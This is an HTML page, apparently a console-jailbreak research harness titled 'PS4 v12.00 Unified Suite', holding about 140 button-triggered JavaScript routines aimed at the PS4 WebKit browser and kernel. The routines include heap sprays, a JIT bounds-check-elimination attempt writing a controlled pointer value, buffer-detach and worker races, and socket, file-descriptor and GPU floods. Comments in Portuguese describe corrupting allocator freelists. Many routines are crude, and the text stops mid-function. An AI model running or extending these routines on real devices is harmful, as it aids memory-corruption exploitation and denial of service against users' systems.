<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 v12.00 Unified Suite</title>

</head>
<body>

        <div class="container">
        
        <div>          
            <button class="wk-btn" onclick="runTest66()">66. DataView Detach</button>
            <button class="wk-btn" onclick="runTest67()">67. DOMPoint ReadOnly</button>
            <button class="wk-btn" onclick="runTest68()">68. SVG Filter Cycle</button>
            <button class="wk-btn" onclick="runTest69()">69. Array Splice OOB</button>
            <button class="wk-btn" onclick="runTest70()">70. WeakRef Race</button>    
            <button class="kr-btn" onclick="runTest71()">71. WebGL Blit OOB</button>
            <button class="kr-btn" onclick="runTest72()">72. Audio Decode Race</button>
            <button class="kr-btn" onclick="runTest73()">73. Texture Unpack</button>
            <button class="kr-btn" onclick="runTest74()">74. WebSocket Flood</button>
            <button class="kr-btn" onclick="runTest75()">75. Shader Padding</button>       
            <button class="wk-btn" onclick="runTest76()">76. String Concat (strcat)</button>
            <button class="wk-btn" onclick="runTest77()">77. Sprintf Overflow</button>
            <button class="wk-btn" onclick="runTest78()">78. JSC Alloc Mismatch</button>
            <button class="wk-btn" onclick="runTest79()">79. Gets Zero Buffer</button>
            <button class="wk-btn" onclick="runTest80()">80. Strcat Overlap</button>  
            <button class="kr-btn" onclick="runTest81()">81. Alloca Stack</button>
            <button class="kr-btn" onclick="runTest82()">82. Free Bad Pointer</button>
            <button class="kr-btn" onclick="runTest83()">83. Pthread RdLock</button>
            <button class="kr-btn" onclick="runTest84()">84. Pthread WrLock</button>
            <button class="kr-btn" onclick="runTest85()">85. Sysctl Sched</button>     
            <button class="wk-btn" onclick="runTest86()">86. SharedWorker Proxy</button>
            <button class="wk-btn" onclick="runTest87()">87. Alloc Size Panic</button>
            <button class="wk-btn" onclick="runTest88()">88. Console Format OOB</button>
            <button class="wk-btn" onclick="runTest89()">89. Promise Corruption</button>
            <button class="wk-btn" onclick="runTest90()">90. Intl Locale Overflow</button>      
            <button class="kr-btn" onclick="runTest91()">91. HID Buffer Write</button>
            <button class="kr-btn" onclick="runTest92()">92. Mlock Exhaustion</button>
            <button class="kr-btn" onclick="runTest93()">93. TLS Memory Error</button>
            <button class="kr-btn" onclick="runTest94()">94. FD Flood</button>
            <button class="kr-btn" onclick="runTest95()">95. OpenSSL Deadlock</button>   
            <button class="wk-btn" onclick="runTest96()">96. bmalloc IsoHeap</button>
            <button class="wk-btn" onclick="runTest97()">97. Exception Scope</button>
            <button class="wk-btn" onclick="runTest98()">98. TextDecoder State</button>
            <button class="wk-btn" onclick="runTest99()">99. JIT StructureID</button>
            <button class="wk-btn" onclick="runTest100()">100. MsgPort Loop</button>    
            <button class="kr-btn" onclick="runTest101()">101. ACP Registers</button>
            <button class="kr-btn" onclick="runTest102()">102. IPC Flood</button>
            <button class="kr-btn" onclick="runTest103()">103. Cache Write Race</button>
            <button class="kr-btn" onclick="runTest104()">104. WASM Grow Fail</button>
            <button class="kr-btn" onclick="runTest105()">105. GPU Sync Stall</button>      
            <button class="wk-btn" onclick="runTest106()">106. Proxy Stack</button>
            <button class="wk-btn" onclick="runTest107()">107. ID Swizzle</button>
            <button class="wk-btn" onclick="runTest108()">108. RegExp Bomb</button>
            <button class="wk-btn" onclick="runTest109()">109. TypedArray Race</button>
            <button class="wk-btn" onclick="runTest110()">110. Import Deadlock</button>     
            <button class="kr-btn" onclick="runTest111()">111. TLS Alloc Flood</button>
            <button class="kr-btn" onclick="runTest112()">112. ACP Desync</button>
            <button class="kr-btn" onclick="runTest113()">113. Map Frag</button>
            <button class="kr-btn" onclick="runTest114()">114. Mbuf Exhaust</button>
            <button class="kr-btn" onclick="runTest115()">115. Sysmod Race</button>    
            <button class="wk-btn" onclick="runTest116()">116. Stack Smash</button>
            <button class="wk-btn" onclick="runTest117()">117. Static Guard</button>
            <button class="wk-btn" onclick="runTest118()">118. Array Masquerade</button>
            <button class="wk-btn" onclick="runTest119()">119. RegExp OOB</button>
            <button class="wk-btn" onclick="runTest120()">120. NodeFilter UAF</button>       
            <button class="kr-btn" onclick="runTest121()">121. DTV Slot</button>
            <button class="kr-btn" onclick="runTest122()">122. mlock Overflow</button>
            <button class="kr-btn" onclick="runTest123()">123. UMTX Queue</button>
            <button class="kr-btn" onclick="runTest124()">124. Socket DoubleFree</button>
            <button class="kr-btn" onclick="runTest125()">125. IPv6 Frag</button>    
            <button class="wk-btn" onclick="runTest126()">126. RegExp Unicode</button>
            <button class="wk-btn" onclick="runTest127()">127. AudioWorklet Mem</button>
            <button class="wk-btn" onclick="runTest128()">128. StructID Wrap</button>
            <button class="wk-btn" onclick="runTest129()">129. Rope OOM</button>
            <button class="wk-btn" onclick="runTest130()">130. Map UAF</button>    
            <button class="kr-btn" onclick="runTest131()">131. SCTP Flood</button>
            <button class="kr-btn" onclick="runTest132()">132. XForm Feedback</button>
            <button class="kr-btn" onclick="runTest133()">133. DTV Spam</button>
            <button class="kr-btn" onclick="runTest134()">134. Blob Race</button>
            <button class="kr-btn" onclick="runTest135()">135. FPU Context</button>
            <button class="wk-btn" onclick="runWebkit1()">1. bmalloc IsoHeap UAF</button>
            <button class="wk-btn" onclick="runWebkit2()">2. JIT Array Bounds Elim</button>
            <button class="wk-btn" onclick="runWebkit3()">3. StringImpl Rope Race</button>
            <button class="kr-btn" onclick="runKernel1()">4. UMTX Thread Deadlock</button>
            <button class="kr-btn" onclick="runKernel2()">5. Socket mbuf Double-Free</button>
            <button class="kr-btn" onclick="runKernel3()">6. GPU Command Buffer OOB</button>
            <button class="wk-btn" onclick="runTest136()">136. FontFaceSet Iterator UAF</button>
            <button class="wk-btn" onclick="runTest137()">137. OffscreenCanvas Transfer Race</button>
            <button class="wk-btn" onclick="runTest138()">138. Large String Normalize Overflow</button>
              <button class="kr-btn" onclick="runTest139()">139. GPU Index Buffer Wrap</button>
            <button class="kr-btn" onclick="runTest140()">140. Nested Blob VFS Recursion</button>
            <button class="kr-btn" onclick="runTest141()">141. SharedMem Atomic Deadlock</button>
            <button onclick="runTest142()">142. bmalloc IsoHeap Poisoning</button>
            <button onclick="runTest143()">143. JIT Array Type Confusion</button>
            <button onclick="runTest144()">144. CSS FontFace Set UAF</button>     
            <button onclick="runTest145()">145. UMTX Kernel Deadlock</button>
            <button onclick="runTest146()">146. GPU Indirect Draw OOB</button>
            <button onclick="runTest147()">147. VM Map Fragmentation (mlock)</button>
            <button onclick="runTest148()">148. Array Concat Spreadable Race</button>
            <button onclick="runTest149()">149. RegExp LastIndex JIT Confusion</button>
            <button onclick="runTest150()">150. WASM Table Grow Thread Race</button>
            <button onclick="runTest151()">151. NetBSD mbuf Cluster Spray</button>
            <button onclick="runTest152()">152. GPU Shader Loop Unroll Crash</button>
            <button onclick="runTest153()">153. kqueue/Kevent Race Simulation</button>
            <button class="wk-btn" onclick="runTest154()">154. TextEncoder Detach Race</button>
            <button class="wk-btn" onclick="runTest155()">155. Symbol.species Allocator Trap</button>
            <button class="wk-btn" onclick="runTest156()">156. History State Cyclic Crash</button>    
            <button class="kr-btn" onclick="runTest157()">157. GPU Viewport Tiling Overflow</button>
            <button class="kr-btn" onclick="runTest158()">158. Socket Option (IP_TOS) Flood</button>
            <button class="kr-btn" onclick="runTest159()">159. ACP Audio Context Suspend Race</button>
            <button class="wk-btn" onclick="runTest160()">160. bmalloc Gigacage Bypass</button>
            <button class="wk-btn" onclick="runTest161()">161. RegExp JIT Side-Effect</button>
            <button class="wk-btn" onclick="runTest162()">162. SharedWorker Port Zombie</button>       
            <button class="kr-btn" onclick="runTest163()">163. UMTX Lock Upgrade Race</button>
            <button class="kr-btn" onclick="runTest164()">164. VM Map Flip-Flop (RWX)</button>
            <button class="kr-btn" onclick="runTest165()">165. Socket OOB Data Panic</button>
            <button onclick="runTest166()">166. ReadableStream BYOB UAF</button>
            <button onclick="runTest167()">167. JIT Poly-Proto Type Confusion</button>
            <button onclick="runTest168()">168. AudioBuffer Copy Detach Race</button>     
            <button onclick="runTest169()">169. WASM RWX Page Flip Panic</button>
            <button onclick="runTest170()">170. GPU Framebuffer Feedback Loop</button>
            <button onclick="runTest171()">171. BroadcastChannel FD Exhaustion</button>
            <button onclick="runTest172()">172. Arguments Object JIT OOB</button>
            <button onclick="runTest173()">173. WASM Memory Grow/Write Race</button>
            <button onclick="runTest174()">174. Large Array Sort Comparator UAF</button>      
            <button onclick="runTest175()">175. Stack Guard Page Jump (Alloca)</button>
            <button onclick="runTest176()">176. Atomics 64-bit Tearing (UMTX)</button>
            <button onclick="runTest177()">177. Gamepad Vibration Integer Overflow</button>
            <button onclick="runTest178()">178. Array Butterfly Realloc Race</button>
            <button onclick="runTest179()">179. Error.stack Stack Buffer Overflow</button>
            <button onclick="runTest180()">180. DataView Unaligned 64-bit Access</button>
            <button onclick="runTest181()">181. HID Output Report Overflow (hmd_cr)</button>
            <button onclick="runTest182()">182. VM TLB Shootdown Race (RWX)</button>
            <button onclick="runTest183()">183. Kernel Event Queue (kqueue) UAF</button>
            <button onclick="runTest184()">184. WASM Global Type Confusion</button>
            <button onclick="runTest185()">185. TextTrackList Mutation UAF</button>
            <button onclick="runTest186()">186. BigInt64 Value Tearing</button>     
            <button onclick="runTest187()">187. GPU Compute Shader Hang</button>
            <button onclick="runTest188()">188. Socket Buffer (ENOBUFS) Panic</button>
            <button onclick="runTest189()">189. mprotect (RWX) Thread Race</button>
            <button onclick="runTest190()">190. ObjectIdentifier Integer Wrap</button>
            <button onclick="runTest191()">191. JIT Loop Hoisting Bounds Bypass</button>    
            <button onclick="runTest193()">193. munmap/mmap Page Fault Race</button>
            <button onclick="runTest194()">194. Dup2 File Descriptor Corruption</button>
            <button onclick="runTest195()">195. GPU Compute Local Memory OOB</button>
            <button onclick="runTest196()">196. JIT Object Materialization OOB</button>
            <button onclick="runTest197()">197. bmalloc Large/Small Confusion</button>
            <button onclick="runTest198()">198. Proxy Revoke Scope Confusion</button>       
            <button onclick="runTest199()">199. MADV_FREE Page Fault Race</button>
            <button onclick="runTest200()">200. GPU Atomic Counter Overflow</button>
            <button onclick="runTest201()">201. SCTP Chunk Heap Corruption</button>
       

    </div>   </div>
  <div id="console">Log do Sistema Iniciado...</div>

    <script>
        function log(msg) {
            const el = document.getElementById('console');
            const line = document.createElement('div');
            line.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            el.appendChild(line);
            el.scrollTop = el.scrollHeight;
        }

        // ==========================================
        //        IMPLEMENTAÇÃO DOS TESTES
        // ==========================================

        // --- 66-70 ---
        function runTest66() {
            log("66. DataView Detach");
            const ab = new ArrayBuffer(1024);
            const view = new DataView(ab);
            for(let i=0; i<1000; i++) view.getInt8(0); // Train
            const w = new Worker(URL.createObjectURL(new Blob([''], {type: 'text/javascript'})));
            w.postMessage(ab, [ab]); // Detach
            try { view.getInt8(100); log("Fail: No crash."); } catch(e) { log("Safe: " + e); }
        }
        function runTest67() {
            log("67. DOMPoint ReadOnly");
            const p = new DOMPointReadOnly(1,2,3,4);
            try { Object.defineProperty(p,'x',{value:{toString:()=>{throw "UAF"}}}); p.matrixTransform(new DOMMatrix()); } catch(e){ log("Executado."); }
        }
        function runTest68() {
            log("68. SVG Filter Cycle");
            const s = document.createElementNS("http://www.w3.org/2000/svg","svg");
            s.innerHTML = '<filter id="f1"><feMergeNode in="f2"/></filter><filter id="f2"><feMergeNode in="f1"/></filter><rect filter="url(#f1)"/>';
            document.body.appendChild(s);
            setTimeout(()=>document.body.removeChild(s), 100);
        }
        function runTest69() {
            log("69. Splice OOB");
            let a=[]; a.length=0xFFFFFFFF;
            try{ a.splice(0xFFFFFFFE, 10, 1); log("Splice exec."); } catch(e){log(e);}
        }
        function runTest70() {
            log("70. WeakRef Race");
            if(!window.WeakRef) return log("N/A");
            let o = {b:new Uint8Array(1024)};
            let r = new WeakRef(o);
            o = null;
            let i = setInterval(()=>{
                let d = r.deref();
                if(!d) { clearInterval(i); log("Coletado."); }
            },0);
        }

        // --- 71-75 ---
        function runTest71() {
            log("71. WebGL Blit OOB");
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl2');
            if(!gl) return log("WebGL2 N/A");
            try { gl.blitFramebuffer(0,0,10000,10000,0,0,10,10,gl.COLOR_BUFFER_BIT,gl.NEAREST); log("Blit Sent"); } catch(e){log(e);}
        }
        function runTest72() {
            log("72. Audio Decode Race");
            let c = new (window.AudioContext||webkitAudioContext)();
            c.decodeAudioData(new Uint8Array(100).buffer).catch(()=>{});
            c.close();
            log("Closed during decode.");
        }
        function runTest73() {
            log("73. Texture Unpack");
            let gl = document.createElement('canvas').getContext('webgl');
            gl.pixelStorei(gl.UNPACK_ALIGNMENT, 8);
            try{ gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,3,3,0,gl.RGBA,gl.UNSIGNED_BYTE,new Uint8Array(10)); } catch(e){}
        }
        function runTest74() {
            log("74. WS Flood");
            try{
                let ws = new WebSocket("ws://127.0.0.1:80");
                ws.onopen = ()=> { for(let i=0;i<100;i++) ws.send(new Uint8Array(1024*1024)); ws.close(); }
            } catch(e){}
        }
        function runTest75() {
            log("75. Shader Padding");
            let gl = document.createElement('canvas').getContext('webgl');
            let s = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(s, "precision mediump float; struct B{bool b; vec3 v; float f; mat4 m;}; uniform B u[10]; void main(){gl_FragColor=vec4(u[5].v,u[5].f);}");
            gl.compileShader(s);
            log("Shader compiled.");
        }

        // --- 76-80 ---
        function runTest76() {
            log("76. String Concat");
            let s = "A"; for(let i=0;i<27;i++) s+=s;
            try{ document.title = s.substring(0,1000); log("Title set."); } catch(e){log(e);}
        }
        function runTest77() {
            log("77. Sprintf Overflow");
            let a=[]; for(let i=0;i<5000;i++) a.push("A");
            try{ console.log("%s".repeat(5000), ...a); } catch(e){}
        }
        function runTest78() {
            log("78. Alloc Mismatch");
            let a=[]; 
            for(let i=0;i<10000;i++) { a.push({x:1}); a.push(new ArrayBuffer(64000)); }
            a=null; log("Heap fragmented.");
        }
        function runTest79() {
            log("79. Gets Zero");
            setTimeout(()=>prompt({toString:()=>""},""),0);
        }
        function runTest80() {
            log("80. Strcat Overlap");
            let u = new Uint8Array(1024); u.copyWithin(1,0);
            log("CopyWithin done.");
        }

        // --- 81-85 ---
        function runTest81() {
            log("81. Alloca Stack");
            let d=0;
            function r(){ d++; history.pushState({},"","/"+d); r(); }
            try{r()}catch(e){log("Stack limit: "+d);}
        }
        function runTest82() {
            log("82. Free Bad Ptr");
            let c = new MessageChannel();
            let w = new Worker(URL.createObjectURL(new Blob(['onmessage=e=>e.data.close()'],{type:'text/javascript'})));
            w.postMessage(c.port1,[c.port1]);
            try{ c.port1.close(); } catch(e){}
        }
        function runTest83() {
            log("83. RdLock");
            if(!window.SharedArrayBuffer) return log("No SAB");
            let s = new SharedArrayBuffer(4096);
            for(let i=0;i<10;i++) new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{let i=new Int32Array(e.data);while(1)Atomics.load(i,0)}'],{type:'text/javascript'}))).postMessage(s);
        }
        function runTest84() {
            log("84. WrLock");
            if(!window.SharedArrayBuffer) return log("No SAB");
            let s = new SharedArrayBuffer(4096);
            new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{let i=new Int32Array(e.data);while(1)Atomics.store(i,0,1)}'],{type:'text/javascript'}))).postMessage(s);
        }
        function runTest85() {
            log("85. Sysctl Sched");
            let c=0;
            let i=setInterval(()=>{ if(c++>200) clearInterval(i); document.body.appendChild(document.createElement('iframe')); },5);
        }

        // --- 86-90 ---
        function runTest86() {
            log("86. SharedWorker Proxy");
            if(!window.SharedWorker) return log("N/A");
            let u = URL.createObjectURL(new Blob([""],{type:'text/javascript'}));
            let w=[];
            for(let i=0;i<50;i++) { let s=new SharedWorker(u,"r"); s.port.start(); w.push(s); }
            setTimeout(()=>{ w.forEach(x=>x.port.close()); w=null; log("Released."); }, 100);
        }
        function runTest87() {
            log("87. Alloc Size");
            let a=[]; 
            for(let i=0;i<5000;i++) { a.push([{}, new ArrayBuffer(64)]); }
            log("Allocated.");
        }
        function runTest88() {
            log("88. Console OOB");
            let h="A".repeat(10000);
            try{ console.log("%s".repeat(50), h, h); } catch(e){}
        }
        function runTest89() {
            log("89. Promise Race");
            let r; new Promise(x=>r=x);
            let m = new MessageChannel();
            m.port1.onmessage = ()=> r("A");
            for(let i=0;i<100;i++) { m.port2.postMessage(0); r("B"); }
        }
        function runTest90() {
            log("90. Intl Locale");
            let l="en"; for(let i=0;i<2000;i++) l+="-u-nu-latn";
            try{ new Intl.NumberFormat(l); } catch(e){}
        }

        // --- 91-95 ---
        function runTest91() {
            log("91. HID Write");
            setInterval(()=>{
               let g=navigator.getGamepads();
               if(g[0]&&g[0].vibrationActuator) g[0].vibrationActuator.playEffect("dual-rumble",{duration:100,weakMagnitude:1.0});
            }, 10);
        }
        function runTest92() {
            log("92. Mlock");
            let m=[]; 
            let i=setInterval(()=>{
                WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0])).then(x=>m.push(x));
                if(m.length>2000) clearInterval(i);
            },1);
        }
        function runTest93() {
            log("93. TLS Memory");
            let u = URL.createObjectURL(new Blob(["setInterval(()=>{},1000)"],{type:'text/javascript'}));
            let c=0;
            let i=setInterval(()=>{ try{new Worker(u);c++}catch(e){clearInterval(i); log("Max: "+c);} }, 5);
        }
        function runTest94() {
            log("94. FD Flood");
            for(let i=0;i<1000;i++) try{ new WebSocket("ws://127.0.0.1:"+(10000+i)).onerror=()=>{}; } catch(e){}
        }
        function runTest95() {
            log("95. SSL Deadlock");
            for(let i=0;i<50;i++) fetch("https://1.1.1.1?"+Math.random()).catch(()=>{});
        }

        // --- 96-100 ---
        function runTest96() {
            log("96. bmalloc IsoHeap");
            let s=[]; for(let i=0;i<2000;i++) s.push(new ArrayBuffer(16));
            for(let i=0;i<2000;i+=2) s[i]=null;
            log("Heap sprayed.");
        }
        function runTest97() {
            log("97. Exception Scope");
            let o={}; 
            Object.defineProperty(o,'e',{get:()=>{ try{throw 1}catch(e){return o.e+1} }});
            try{ let x = o.e; } catch(e){log("Stack limit.");}
        }
        function runTest98() {
            log("98. TextDecoder");
            let t = new TextDecoder();
            for(let i=0;i<500;i++) t.decode(new Uint8Array([0xFF]), {stream:true});
            log("Stream dirty.");
        }
        function runTest99() {
            log("99. JIT StructID");
            let a=[]; for(let i=0;i<500;i++) a.push({a:1,b:2,c:3});
            for(let i=0;i<500;i++) { delete a[i].b; a[i].d=4; }
            log("Transitions done.");
        }
        function runTest100() {
            log("100. MsgPort Loop");
            let c1=new MessageChannel(), c2=new MessageChannel();
            c1.port1.postMessage("",[c2.port1]);
            c2.port2.postMessage("",[c1.port2]);
        }

        // --- 101-105 ---
        function runTest101() {
            log("101. ACP Regs");
            let c = new (window.AudioContext||webkitAudioContext)();
            let f = c.createBiquadFilter();
            f.connect(c.destination);
            let t = ["lowpass","highpass","notch"];
            let i=setInterval(()=>{ f.type=t[Math.floor(Math.random()*3)]; }, 5);
            setTimeout(()=>clearInterval(i), 2000);
        }
        function runTest102() {
            log("102. IPC Flood");
            let c=[]; for(let i=0;i<1000;i++) try{c.push(new BroadcastChannel("c"+i));}catch(e){}
        }
        function runTest103() {
            log("103. Cache Race");
            caches.open("r").then(c=>{ c.put("/a", new Response("A")); setTimeout(()=>c.delete("/a"),0); });
        }
        function runTest104() {
            log("104. WASM Grow");
            try {
                let m = new WebAssembly.Memory({initial:10, maximum:1000});
                setInterval(()=>{try{m.grow(50)}catch(e){}}, 10);
            } catch(e){}
        }
        function runTest105() {
            log("105. GPU Stall");
            let gl = document.createElement('canvas').getContext('webgl2');
            if(!gl) return log("N/A");
            let s = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
            gl.clientWaitSync(s,0,0);
            gl.getExtension('WEBGL_lose_context').loseContext();
        }

        // --- 106-110 ---
        function runTest106() {
            log("106. Proxy Stack");
            let p = new Proxy({}, {get:(t,k,r)=>r[k]});
            try{ p.a } catch(e){}
        }
        function runTest107() {
            log("107. ID Swizzle");
            let a=[]; for(let i=0;i<2000;i++) { let o={}; o['p'+i]=1; a.push(o); }
            log("IDs generated.");
        }
        function runTest108() {
            log("108. RegExp Bomb");
            try { let r=new RegExp("(".repeat(1000)+"a"+")".repeat(1000)); r.test("a"); } catch(e){}
        }
        function runTest109() {
            log("109. TypedArray Race");
            let s = new Uint8Array(100);
            Object.defineProperty(s,'length',{get:()=>{try{structuredClone(s.buffer,{transfer:[s.buffer]})}catch(e){}; return 100;}});
            try { new Uint8Array(s); } catch(e){}
        }
        function runTest110() {
            log("110. Import Deadlock");
            let b = new Blob(["import './b.js'"],{type:'text/javascript'});
            try{ import(URL.createObjectURL(b)); } catch(e){}
        }

        // --- 111-115 ---
        function runTest111() {
            log("111. TLS Alloc");
            let u = URL.createObjectURL(new Blob([""],{type:'text/javascript'}));
            let w=[];
            setInterval(()=>{
                if(w.length>30) w.shift().terminate();
                try{w.push(new Worker(u));}catch(e){}
            }, 10);
        }
        function runTest112() {
            log("112. ACP Desync");
            let i=setInterval(()=>{
                let c = new (window.AudioContext||webkitAudioContext)({latencyHint: Math.random()});
                c.close();
            }, 50);
            setTimeout(()=>clearInterval(i),2000);
        }
        function runTest113() {
            log("113. Map Frag");
            let a=[];
            for(let i=0;i<200;i++) { a.push(new ArrayBuffer(1024)); a.push(document.createElement('canvas').getContext('2d')); }
            log("Map fragmented.");
        }
        function runTest114() {
            log("114. Mbuf");
            let p = new RTCPeerConnection();
            let d = p.createDataChannel("x");
            p.createOffer().then(o=>p.setLocalDescription(o));
        }
        function runTest115() {
            log("115. Sysmod Race");
            let v = document.createElement('video');
            let i=setInterval(()=>{ v.src="x.mp4"; setTimeout(()=>v.src="",5); }, 20);
            setTimeout(()=>clearInterval(i),2000);
        }

        // --- 116-120 ---
        function runTest116() {
            log("116. Stack Smash");
            let d=0;
            function r(){ try{d++; if(d>2000)throw 1; r()}catch(e){if(d%100==0)throw e;} }
            try{r()}catch(e){}
        }
        function runTest117() {
            log("117. Static Guard");
            let u = URL.createObjectURL(new Blob(["try{throw 1}catch(e){}"],{type:'text/javascript'}));
            for(let i=0;i<20;i++) new Worker(u);
        }
        function runTest118() {
            log("118. Array Masquerade");
            let o={length:0xFFFFFF, [Symbol.iterator]:function*(){yield 1}};
            try{ new Uint8Array(o); } catch(e){}
        }
        function runTest119() {
            log("119. RegExp OOB");
            try{ new RegExp("[\\u0000-\\uFFFF]{1000,}").test("A".repeat(500)); } catch(e){}
        }
        function runTest120() {
            log("120. NodeFilter UAF");
            let d=document.createElement('div'); d.innerHTML="<b>A</b>";
            let w=document.createTreeWalker(d,1,{acceptNode:n=>{d.innerHTML=""; return 1;}});
            try{w.nextNode()}catch(e){}
        }

        // --- 121-125 ---
        function runTest121() {
            log("121. DTV Slot");
            let u = URL.createObjectURL(new Blob(["let a=1,b=2;setInterval(()=>{},1000)"],{type:'text/javascript'}));
            let w=[];
            setInterval(()=>{ try{w.push(new Worker(u)); if(w.length>50)w.shift().terminate();}catch(e){} }, 20);
        }
        function runTest122() {
            log("122. mlock");
            let m=[]; for(let i=0;i<2000;i++) try{m.push(new WebAssembly.Memory({initial:1}));}catch(e){}
        }
        function runTest123() {
            log("123. UMTX Queue");
            if(!window.SharedArrayBuffer) return log("N/A");
            let s=new SharedArrayBuffer(4);
            let w=new Worker(URL.createObjectURL(new Blob(['onmessage=e=>{let i=new Int32Array(e.data);while(1)Atomics.notify(i,0,1)}'],{type:'text/javascript'})));
            w.postMessage(s);
            let i=setInterval(()=>{ Atomics.wait(new Int32Array(s),0,0,0); }, 0);
            setTimeout(()=>{clearInterval(i);w.terminate()},2000);
        }
        function runTest124() {
            log("124. Socket Free");
            try{ let w=new WebSocket("ws://0.0.0.0"); w.onopen=()=>{w.send("A");w.close();w.send("B");} } catch(e){}
        }
        function runTest125() {
            log("125. IPv6 Frag");
            let p=new RTCPeerConnection();
            p.createOffer().then(o=>{
                let s=o.sdp; for(let i=0;i<100;i++) s+=`a=candidate:${i} 1 UDP 1 ::1 1 typ host\r\n`;
                p.setLocalDescription({type:"offer",sdp:s});
            });
        }

        // --- 126-130 ---
        function runTest126() {
            log("126. RegExp Unicode");
            try { new RegExp("([\\u0000-\\u00FF]){100,}").test("A".repeat(1000)); } catch(e){}
        }
        function runTest127() {
            log("127. AudioWorklet Mem");
            if(!window.AudioContext) return log("N/A");
            let c = new AudioContext();
            let s = new SharedArrayBuffer(1024);
            let b = new Blob([`registerProcessor('p',class extends AudioWorkletProcessor{constructor(){super();this.port.onmessage=e=>this.s=new Int32Array(e.data)}process(){if(this.s)this.s[0]=1;return true}})`],{type:'text/javascript'});
            c.audioWorklet.addModule(URL.createObjectURL(b)).then(()=>{
                let n=new AudioWorkletNode(c,'p'); n.port.postMessage(s); n.connect(c.destination);
                let w=new Worker(URL.createObjectURL(new Blob([''],{type:'text/javascript'})));
                setInterval(()=>{w.postMessage(s)},1);
            });
        }
        function runTest128() {
            log("128. StructID Wrap");
            let a=[]; for(let i=0;i<5000;i++) { let o={}; o['p'+Math.random()]=1; a.push(o); if(i%1000==0)a=[]; }
        }
        function runTest129() {
            log("129. Rope OOM");
            let s="A"; for(let i=0;i<24;i++)s+=s;
            try{ s.charAt(s.length-1); }catch(e){log("OOM");}
        }
        function runTest130() {
            log("130. Map UAF");
            let m=new Map(); for(let i=0;i<500;i++)m.set(i,i);
            let it=m.entries(); it.next();
            m.clear(); for(let i=0;i<100;i++)m.set(i,"x");
            try{it.next()}catch(e){}
        }

        // --- 131-135 ---
        function runTest131() {
            log("131. SCTP Flood");
            let p=new RTCPeerConnection();
            let d=p.createDataChannel("x",{ordered:false,maxRetransmits:0});
            p.createOffer().then(o=>p.setLocalDescription(o));
            setInterval(()=>{ try{d.send(new Uint8Array(100));}catch(e){} }, 5);
        }
        function runTest132() {
            log("132. XForm OOB");
            let gl=document.createElement('canvas').getContext('webgl2');
            if(!gl) return log("N/A");
            let p=gl.createProgram();
            let v=gl.createShader(gl.VERTEX_SHADER); gl.shaderSource(v,"#version 300 es\nvoid main(){gl_Position=vec4(1);}"); gl.compileShader(v);
            gl.attachShader(p,v); gl.transformFeedbackVaryings(p,["gl_Position"],gl.SEPARATE_ATTRIBS); gl.linkProgram(p); gl.useProgram(p);
            let b=gl.createBuffer(); gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER,b); gl.bufferData(gl.TRANSFORM_FEEDBACK_BUFFER,4,gl.STATIC_DRAW); gl.bindBufferBase(gl.TRANSFORM_FEEDBACK_BUFFER,0,b);
            gl.beginTransformFeedback(gl.POINTS); gl.drawArrays(gl.POINTS,0,500); gl.endTransformFeedback();
        }
        function runTest133() {
            log("133. DTV Spam");
            runTest111(); // Same logic
        }
        function runTest134() {
            log("134. Blob Race");
            let b=new Blob(["A".repeat(1000)]); let f=new FileReader();
            setInterval(()=>{ f.readAsArrayBuffer(b.slice(0,100)); }, 5);
        }
        function runTest135() {
            log("135. FPU Context");
            let u=URL.createObjectURL(new Blob(["onmessage=()=>{while(1)Math.sin(Math.random())}"],{type:'text/javascript'}));
            for(let i=0;i<10;i++) new Worker(u).postMessage(0);
        }

     // ==========================================
        //        WEBKIT VECTORS (Userland)
        // ==========================================

        // TESTE 1: bmalloc IsoHeap Use-After-Free
        // Baseado em: "bmalloc_IsoHeap" encontrado em 1200_libSceNKWebKit.json.
        // Tenta corromper a lista de memória livre (freelist) do alocador proprietário.
        function runWebkit1() {
            log("Injecting: bmalloc IsoHeap Corruption...");
            
            // Cria buffers que caem em buckets específicos do bmalloc (ex: 1024 bytes)
            let spray = [];
            const SIZE = 1024;
            
            try {
                // 1. Aloca massivamente
                for(let i=0; i<5000; i++) spray.push(new ArrayBuffer(SIZE));
                
                // 2. Cria "buracos" no heap (free)
                // Transferir um ArrayBuffer esvazia-o (free implícito no engine)
                const worker = new Worker(URL.createObjectURL(new Blob([''], {type: 'text/javascript'})));
                for(let i=0; i<spray.length; i+=2) {
                    if(spray[i]) worker.postMessage(spray[i], [spray[i]]);
                }
                
                // 3. Tenta realocar no buraco com tipo diferente (TypedArray vs DataView)
                // Se o bmalloc não limpou o ponteiro, ocorre sobreposição.
                let confuse = [];
                for(let i=0; i<2000; i++) confuse.push(new Uint32Array(SIZE/4));
                
                log("Heap Sprayed & Fragmented. Check for crash.");
            } catch(e) { log("Error: " + e); }
        }

        // TESTE 2: JIT Array Bounds Check Elimination
        // Baseado em: "UnlinkedCodeBlock" e otimizações JIT no WebKit.
        // Tenta enganar o compilador JIT para remover a verificação de limites de um array.
        function runWebkit2() {
            log("Injecting: JIT Bounds Elimination...");
            
            const arr = [1.1];
            const i32 = new Int32Array(1);
            
            // Função para treinar o JIT (polimórfica)
            function opt(a, i) {
                // O JIT pode tentar otimizar este acesso removendo o check
                // se achar que 'i' é sempre seguro.
                a[i] = 1.04380972981885e-310; // 0x41414141 em float (Ponteiro controlado)
            }
            
            for(let i=0; i<10000; i++) opt(arr, 0); // Treina com acesso seguro
            
            try {
                // Executa com índice fora dos limites após o JIT estar "quente"
                opt(arr, 1000); 
                log("JIT Code executed (Potential OOB Write).");
            } catch(e) { log("JSC caught OOB: " + e); }
        }

        // TESTE 3: StringImpl Rope Race Condition
        // Baseado em: "strcat" logs em 1200_libSceLibcInternal.json.
        // Explora strings do tipo "Rope" (concatenadas preguiçosamente).
        function runWebkit3() {
            log("Injecting: Rope String Race...");
            
            let s = "A";
            // Cria uma Rope String gigante (memória lógica alta, física baixa)
            for (let i = 0; i < 24; i++) s += s; 

            // Worker tenta acessar a string enquanto a main thread a modifica
            // Isso força o "flattening" (materialização) da string em threads concorrentes.
            const blob = new Blob([`
                onmessage = e => {
                    let s = e.data;
